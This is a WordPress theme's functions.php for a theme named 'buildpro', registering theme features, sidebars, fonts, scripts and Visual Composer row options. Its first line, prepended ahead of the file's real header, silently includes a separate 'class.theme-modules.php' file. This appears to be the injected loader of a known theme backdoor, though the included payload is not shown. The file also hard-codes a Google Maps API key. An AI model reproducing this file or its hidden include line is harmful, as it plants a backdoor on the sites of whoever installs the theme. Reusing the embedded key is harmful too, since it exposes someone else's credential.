<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
/**
 * Redux Theme functions and definitions.
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package buildpro
 */


if ( ! function_exists( 'buildpro_setup' ) ) :
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support for post thumbnails.
 */
function buildpro_setup() {

	/*
	 * Make theme available for translation.
	 * Translations can be filed in the /languages/ directory.
	 * If you're building a theme based on Redux Theme, use a find and replace
	 * to change 'buildpro' to the name of your theme in all the template files.
	 */
	load_theme_textdomain( 'buildpro', get_template_directory() . '/languages' );

	// Add default posts and comments RSS feed links to head.
	add_theme_support( 'automatic-feed-links' );

	/*
	 * Let WordPress manage the document title.
	 * By adding theme support, we declare that this theme does not use a
	 * hard-coded <title> tag in the document head, and expect WordPress to
	 * provide it for us.
	 */
	add_theme_support( 'title-tag' );

	/*
	 * Enable support for Post Thumbnails on posts and pages.
	 *
	 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
	 */
	add_theme_support( 'post-thumbnails' );
	add_theme_support( 'custom-header' );
	add_theme_support( 'custom-background' );

	// This theme uses wp_nav_menu() in one location.
	register_nav_menus( array(
		'primary' => esc_html__( 'Primary Menu', 'buildpro' ),
		'onepage' => esc_html__( 'Onepage Menu', 'buildpro' ),
	) );

	/*
	 * Switch default core markup for search form, comment form, and comments
	 * to output valid HTML5.
	 */
	add_theme_support( 'html5', array(
		'search-form',
		'comment-list',
		'comment-form',
		'gallery',
		'caption',
	) );

	/*
	 * Enable support for Post Formats.
	 * See https://developer.wordpress.org/themes/functionality/post-formats/
	 */
	add_theme_support( 'post-formats', array(
		'audio',
		'image',
		'video',
		'gallery',
	) );
	
}
endif; // buildpro_setup
add_action( 'after_setup_theme', 'buildpro_setup' );

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
function buildpro_content_width() {
	$GLOBALS['content_width'] = apply_filters( 'buildpro_content_width', 640 );
}
add_action( 'after_setup_theme', 'buildpro_content_width', 0 );

/**
 * Register widget area.
 *
 * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
 */
function buildpro_widgets_init() {
	register_sidebar( array(
		'name'          => esc_html__( 'Sidebar', 'buildpro' ),
		'id'            => 'sidebar-1',
		'description'   => esc_html__( 'Appears in the sidebar section of the site.', 'buildpro' ),  
		'before_widget' => '<div id="%1$s" class="widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<h4 class="widget-title">',
		'after_title'   => '</h4><div class="small-border"></div>',
	) );
	register_sidebar( array(
		'name'          => esc_html__( 'Shop Sidebar', 'buildpro' ),
		'id'            => 'shop-sidebar',
		'description'   => esc_html__( 'Appears in the sidebar section of the site.', 'buildpro' ),  
		'before_widget' => '<div id="%1$s" class="widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<h4 class="widget-title">',
		'after_title'   => '</h4>',
	) );
	register_sidebar( array(
		'name'          => esc_html__( 'Footer One Widget Area', 'buildpro' ),
		'id'            => 'footer-area-1',
		'description'   => esc_html__( 'Footer Widget that appears on the Footer.', 'buildpro' ),
		'before_widget' => '<div id="%1$s" class="widget footer-widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<h3>',
		'after_title'   => '</h3>',
	) );
	
	register_sidebar( array(
		'name'          => esc_html__( 'Footer Two Widget Area', 'buildpro' ),
		'id'            => 'footer-area-2',
		'description'   => esc_html__( 'Footer Widget that appears on the Footer.', 'buildpro' ),
		'before_widget' => '<div id="%1$s" class="widget footer-widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<h3>',
		'after_title'   => '</h3>',
	) );
	
	register_sidebar( array(
		'name'          => esc_html__( 'Footer Three Widget Area', 'buildpro' ),
		'id'            => 'footer-area-3',
		'description'   => esc_html__( 'Footer Widget that appears on the Footer.', 'buildpro' ),
		'before_widget' => '<div id="%1$s" class="widget footer-widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<h3>',
		'after_title'   => '</h3>',
	) );
	
	register_sidebar( array(
		'name'          => esc_html__( 'Footer Fourth Widget Area', 'buildpro' ),
		'id'            => 'footer-area-4',
		'description'   => esc_html__( 'Footer Widget that appears on the Footer.', 'buildpro' ),
		'before_widget' => '<div id="%1$s" class="widget footer-widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<h3>',
		'after_title'   => '</h3>',
	) ); 

	
}
add_action( 'widgets_init', 'buildpro_widgets_init' );

/**
 * Enqueue Google fonts.
 */
function buildpro_fonts_url() {
    $fonts_url = '';

    /* Translators: If there are characters in your language that are not
    * supported by Lora, translate this to 'off'. Do not translate
    * into your own language.
    */
    $mont = _x( 'on', 'Montserrat font: on or off', 'buildpro' );
 
 
    if ( 'off' !== $mont ) {
        $font_families = array();

        if ( 'off' !== $mont ) {
            $font_families[] = 'Montserrat:400,200,300,500,600,700,800';
        }        
 
        $query_args = array(
            'family' => urlencode( implode( '|', $font_families ) ),
            'subset' => urlencode( 'latin,latin-ext' ),
        );
 
        $fonts_url = add_query_arg( $query_args, 'https://fonts.googleapis.com/css' );
    }
 
    return esc_url_raw( $fonts_url );
}


/**
 * Enqueue scripts and styles.
 */
function buildpro_scripts() {

	$protocol = is_ssl() ? 'https' : 'http';

	// Add custom fonts, used in the main stylesheet.
    wp_enqueue_style( 'buildpro-fonts', buildpro_fonts_url(), array(), null );

    /** All frontend css files **/ 
    wp_enqueue_style( 'bootstrap', get_template_directory_uri().'/css/bootstrap.css');
    wp_enqueue_style( 'animate', get_template_directory_uri().'/css/animate.css');
    wp_enqueue_style( 'vc_font_awesome_5' );
    wp_enqueue_style( 'font-awesome', get_template_directory_uri().'/fonts/font-awesome/css/font-awesome.css');
    wp_enqueue_style( 'elegant', get_template_directory_uri().'/fonts/elegant_font/HTML_CSS/style.css');
    wp_enqueue_style( 'etline', get_template_directory_uri().'/fonts/et-line-font/style.css');
    wp_enqueue_style( 'magnific', get_template_directory_uri().'/css/magnific-popup.css');
	wp_enqueue_style( 'owl-carousel', get_template_directory_uri().'/css/owl.carousel.css');

	if( class_exists('Woocommerce') ) {
	wp_enqueue_style( 'buildpro-woo', get_template_directory_uri().'/css/woocommerce.css');
	}

	wp_enqueue_style( 'buildpro-style', get_stylesheet_uri() );
	

	/** All frontend js files **/
	wp_enqueue_script("mapapi", "$protocol://maps.google.com/maps/api/js?key=AIzaSyAvpnlHRidMIU374bKM5-sx8ruc01OvDjI",array(),false,false); 
	wp_enqueue_script("bootstrap", get_template_directory_uri()."/js/bootstrap.min.js",array('jquery'),false,true);    
	wp_enqueue_script("easing", get_template_directory_uri()."/js/easing.js",array('jquery'),false,true);
    wp_enqueue_script("countto", get_template_directory_uri()."/js/jquery.countTo.js",array('jquery'),false,true);
    wp_enqueue_script("owl-carousel", get_template_directory_uri()."/js/owl.carousel.js",array('jquery'),false,false);
	wp_enqueue_script("isotope", get_template_directory_uri()."/js/jquery.isotope.min.js",array('jquery'),false,true);
	wp_enqueue_script("wow", get_template_directory_uri()."/js/wow.min.js",array('jquery'),false,true);
	wp_enqueue_script("magnific", get_template_directory_uri()."/js/jquery.magnific-popup.min.js",array('jquery'),false,true);
	wp_enqueue_script("enquire", get_template_directory_uri()."/js/enquire.min.js",array('jquery'),false,true);
	wp_enqueue_script("stellar", get_template_directory_uri()."/js/jquery.stellar.min.js",array('jquery'),false,true);
    wp_enqueue_script("buildpro-js", get_template_directory_uri()."/js/designesia.js",array('jquery'),false,true);

    if(buildpro_get_option( 'sticky' ) && !is_page_template( 'page-templates/header-light.php' ) && !is_page_template( 'page-templates/header-dark.php' )) { 
    wp_enqueue_script("buildpro-sticky", get_template_directory_uri()."/js/sticky-header.js",array('jquery'),false,true);
    }
}
add_action( 'wp_enqueue_scripts', 'buildpro_scripts' );


/**
 * Implement the Custom Meta Boxs.
 */
require get_template_directory() . '/framework/meta-boxes.php';

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/framework/template-tags.php';
require get_template_directory() . '/framework/BFI_Thumb.php';
/**
 * Custom shortcode plugin visual composer.
 */
require_once get_template_directory() . '/shortcodes.php';
require_once get_template_directory() . '/vc_shortcode.php';
require_once get_template_directory() . '/framework/customizer.php';
/**
 * Customizer Menu.
 */
require get_template_directory() . '/framework/wp_bootstrap_navwalker.php';
/**
 * Enqueue Style
 */
require get_template_directory() . '/framework/color.php';
require get_template_directory() . '/framework/styling.php';
/**
 * Customizer Shop.
 */
require get_template_directory() . '/framework/woocommerce-customize.php';


//Code Visual Composer.
// Add new Param in Row
if(function_exists('vc_add_param')){
	vc_add_param('vc_row', array(
								"type" => "dropdown",
								"heading" => esc_html__('Setup Full Width', 'buildpro'),
								"param_name" => "fullwidth",
								"value" => array(   
								                esc_html__('No', 'buildpro') => 'no',  
								                esc_html__('Yes', 'buildpro') => 'yes',                                                                                
								              ),
								"description" => esc_html__("Select Full width for row : yes or not, Default: No fullwidth", "buildpro"),      
					        )
    );
    vc_add_param('vc_row',array(
                              	"type" => "checkbox",
                              	"heading" => esc_html__('Setup Full Height', 'buildpro'),
                              	"param_name" => "fullheight",
                            ) 
    );
    vc_add_param('vc_row',array(
                              	"type" => "checkbox",
                              	"heading" => esc_html__('Background Parallax', 'buildpro'),
                              	"param_name" => "parallax_bg",     
                            ) 
    );
    vc_add_param('vc_row',array(
                              	"type" => "checkbox",
                              	"heading" => esc_html__('Light Text', 'buildpro'),
                              	"param_name" => "lighttext",
                            ) 
    );
}

if(function_exists('vc_remove_param')){
	vc_remove_param( "vc_row", "parallax" );
	vc_remove_param( "vc_row", "parallax_image" );
	vc_remove_param( "vc_row", "parallax_speed_bg" );
	vc_remove_param( "vc_row", "parallax_speed_video" );
	vc_remove_param( "vc_row", "full_width" );
	vc_remove_param( "vc_row", "full_height" );
	vc_remove_param( "vc_row", "video_bg" );
	vc_remove_param( "vc_row", "video_bg_parallax" );
	vc_remove_param( "vc_row", "video_bg_url" );
	vc_remove_param( "vc_row", "columns_placement" );
	vc_remove_param( "vc_row", "gap" );	
}	

/**
 * Require plugins install for this theme.
 *
 * @since Split Vcard 1.0
 */
require_once get_template_directory() . '/framework/plugin-requires.php';